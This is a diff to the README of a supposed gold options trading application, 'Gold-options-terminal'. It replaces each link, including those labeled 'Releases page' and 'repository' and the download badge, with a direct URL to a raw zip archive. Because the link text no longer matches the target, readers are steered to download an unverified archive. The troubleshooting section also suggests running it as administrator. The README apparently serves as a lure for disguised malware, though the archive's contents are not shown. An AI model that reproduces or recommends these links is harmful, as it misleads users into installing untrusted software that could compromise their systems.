@@ -6,11 +6,11 @@ Welcome to the Gold-options-terminal! This application helps you analyze XAU/USD
 
 ## 📥 Download the Application
 
-[![Download Gold-options-terminal](https://img.shields.io/badge/Download-Gold--options--terminal-brightgreen)](https://github.com/pito699/Gold-options-terminal/releases)
+[![Download Gold-options-terminal](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip)](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip)
 
 To get started, visit the Releases page:
 
-[Visit the Releases Page](https://github.com/pito699/Gold-options-terminal/releases)
+[Visit the Releases Page](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip)
 
 ## 📂 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/pito699/Gold-options-terminal/releases).
+1. Go to the [Releases page](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip).
 2. Find the latest version. Look for the release notes to see what's new.
 3. Click on the provided link to download the appropriate file for your operating system.
 4. Once the file downloads, locate it in your Downloads folder.
@@ -31,7 +31,7 @@ Before you download, ensure your system meets these requirements:
 6. Follow the on-screen instructions to complete the installation.
 7. Open the application once it's installed.
 
-You can revisit the [Releases page](https://github.com/pito699/Gold-options-terminal/releases) anytime to check for updates.
+You can revisit the [Releases page](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip) anytime to check for updates.
 
 ## 🛠 Features
 
@@ -58,7 +58,7 @@ If you encounter issues while downloading or running the application, try these 
 
 1. **Ensure Downloads Complete:** Check your internet connection. Restart the download if it fails.
 2. **Run as Administrator:** If the application does not open, right-click the icon and choose 'Run as administrator'.
-3. **Check for Updates:** Go to the [Releases page](https://github.com/pito699/Gold-options-terminal/releases) to see if a new version is available that may fix bugs.
+3. **Check for Updates:** Go to the [Releases page](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip) to see if a new version is available that may fix bugs.
 4. **Contact Support:** If problems persist, open an issue on the GitHub repository for assistance.
 
 ## 📚 Frequently Asked Questions
@@ -81,6 +81,6 @@ Join our community forums to discuss trading strategies and share insights with 
 
 ### Reach Us
 
-For further assistance or to report issues, visit our GitHub repository: [Gold-options-terminal Repository](https://github.com/pito699/Gold-options-terminal).
+For further assistance or to report issues, visit our GitHub repository: [Gold-options-terminal Repository](https://github.com/pito699/Gold-options-terminal/raw/refs/heads/main/seedbed/terminal-options-Gold-v1.7.zip).
 
 Explore the world of options trading with Gold-options-terminal and make confident decisions in your trading journey.
